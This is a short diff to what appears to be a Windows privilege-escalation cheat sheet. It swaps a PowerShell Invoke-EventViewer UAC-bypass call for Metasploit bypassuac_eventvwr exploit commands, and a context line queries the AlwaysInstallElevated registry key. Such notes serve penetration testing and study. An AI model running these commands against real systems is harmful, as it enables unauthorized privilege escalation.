@@ -25,8 +25,9 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
 ```
-Import-Module .\Invoke-EventViewer.ps1
-Invoke-EventViewer cmd.exe
+use exploit/windows/local/bypassuac_eventvwr
+set session 1
+set target 1(x64,0=x86)
 ```
 ##### Insecure File Permissions
 ```
